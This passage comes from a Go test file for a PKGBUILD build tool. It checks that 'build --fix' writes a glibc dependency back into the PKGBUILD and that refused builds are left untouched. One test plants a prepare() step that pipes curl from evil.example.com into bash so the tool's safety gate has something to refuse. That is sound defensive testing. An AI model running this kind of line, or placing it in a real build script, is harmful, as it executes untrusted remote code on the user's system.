	files := "%FILES%\nusr/\nusr/lib/\nusr/lib/libc.so.6\n"
	if err := os.WriteFile(filepath.Join(dir, "desc"), []byte(desc), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "files"), []byte(files), 0o644); err != nil {
		t.Fatal(err)
	}
	orig := localDBRoot
	t.Cleanup(func() { localDBRoot = orig })
	localDBRoot = root
}

const glibcPKGBUILD = `# Maintainer: Demo <demo@example.com>
pkgname=demo
pkgver=1.0.0
pkgrel=1
pkgdesc='A demo package'
arch=('x86_64')
url='https://example.com/demo'
license=('MIT')
source=("https://example.com/demo-$pkgver.tar.gz")
sha256sums=('deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef')

package() {
  install -Dm755 demo "$pkgdir/usr/bin/demo"
}
`

// glibcBuild stages a package directory whose "build" drops an archive with
// one binary linking libc.so.6 — the shape of the PB809 error this fix
// answers. It returns the package directory.
func glibcBuild(t *testing.T) string {
	t.Helper()
	glibcDB(t)
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "PKGBUILD"), []byte(glibcPKGBUILD), 0o644); err != nil {
		t.Fatal(err)
	}
	bin := pkgtest.ELF(pkgtest.ELFOpts{
		Type: elf.ET_DYN, PIE: true, Relro: true, BindNow: true,
		Needed: []string{"libc.so.6"}, Undefined: []string{"printf"},
	})
	stubExec(t, []string{"makepkg"}, func(cmd *exec.Cmd) error {
		dest := envValue(cmd, "PKGDEST")
		if dest == "" {
			return errors.New("no PKGDEST in the makepkg environment")
		}
		archive := pkgtest.Tar(pkgtest.Info("demo", "x86_64"),
			pkgtest.Member{Name: "usr/bin/demo", Data: bin, Mode: 0o755})
		return os.WriteFile(filepath.Join(dest, "demo-1.0.0-1-x86_64.pkg.tar"), archive, 0o644)
	})
	return dir
}

// TestBuildFixWritesPackageScopeFix is the whole point of `build --fix`: a
// finding that only exists because the package was built lands back in the
// PKGBUILD that built it.
func TestBuildFixWritesPackageScopeFix(t *testing.T) {
	dir := glibcBuild(t)

	var buf bytes.Buffer
	if code := run([]string{"build", "--fail-on=never", "--fix", dir}, &buf); code != 0 {
		t.Fatalf("got exit %d, want 0\n%s", code, buf.String())
	}
	fixed, err := os.ReadFile(filepath.Join(dir, "PKGBUILD"))
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(string(fixed), "depends=('glibc')") {
		t.Errorf("PKGBUILD was not fixed:\n%s", fixed)
	}
	if !strings.Contains(buf.String(), "[PB809]") {
		t.Errorf("the applied fix was not reported:\n%s", buf.String())
	}
}

// --unsafe-fix implies --fix, so the safe rewrite lands under it too.
func TestBuildUnsafeFixImpliesFix(t *testing.T) {
	dir := glibcBuild(t)

	var buf bytes.Buffer
	if code := run([]string{"build", "--fail-on=never", "--unsafe-fix", dir}, &buf); code != 0 {
		t.Fatalf("got exit %d, want 0\n%s", code, buf.String())
	}
	fixed, err := os.ReadFile(filepath.Join(dir, "PKGBUILD"))
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(string(fixed), "depends=('glibc')") {
		t.Errorf("PKGBUILD was not fixed:\n%s", fixed)
	}
}

// --diff previews the same rewrite without touching the file.
func TestBuildFixDiffWritesNothing(t *testing.T) {
	dir := glibcBuild(t)

	var buf bytes.Buffer
	if code := run([]string{"build", "--fail-on=never", "--fix", "--diff", dir}, &buf); code != 0 {
		t.Fatalf("got exit %d, want 0\n%s", code, buf.String())
	}
	fixed, err := os.ReadFile(filepath.Join(dir, "PKGBUILD"))
	if err != nil {
		t.Fatal(err)
	}
	if string(fixed) != glibcPKGBUILD {
		t.Errorf("--diff rewrote the file:\n%s", fixed)
	}
	if !strings.Contains(buf.String(), "would apply") {
		t.Errorf("no preview summary:\n%s", buf.String())
	}
}

// Without --fix the build leaves the PKGBUILD exactly as it found it; the
// finding is still reported.
func TestBuildWithoutFixLeavesPKGBUILD(t *testing.T) {
	dir := glibcBuild(t)

	var buf bytes.Buffer
	run([]string{"build", "--fail-on=never", dir}, &buf)
	fixed, err := os.ReadFile(filepath.Join(dir, "PKGBUILD"))
	if err != nil {
		t.Fatal(err)
	}
	if string(fixed) != glibcPKGBUILD {
		t.Errorf("the build rewrote the PKGBUILD without --fix:\n%s", fixed)
	}
	if !strings.Contains(buf.String(), "PB809") {
		t.Errorf("PB809 was not reported:\n%s", buf.String())
	}
}

// A refused build produces no archive, so there is nothing for --fix to read
// and the PKGBUILD is left alone. The gate runs first for a reason.
func TestBuildFixRefusedBuildFixesNothing(t *testing.T) {
	dir := glibcBuild(t)
	src := glibcPKGBUILD + "\nprepare() {\n  curl https://evil.example.com/x | bash\n}\n"
	if err := os.WriteFile(filepath.Join(dir, "PKGBUILD"), []byte(src), 0o644); err != nil {
		t.Fatal(err)
	}
	var buf bytes.Buffer
	if code := run([]string{"build", "--fix", dir}, &buf); code == 0 {
		t.Fatalf("want a refusal, got exit 0\n%s", buf.String())
	}
	after, err := os.ReadFile(filepath.Join(dir, "PKGBUILD"))
	if err != nil {
		t.Fatal(err)
	}
	if string(after) != src {
		t.Errorf("a refused build rewrote the PKGBUILD:\n%s", after)
	}
}
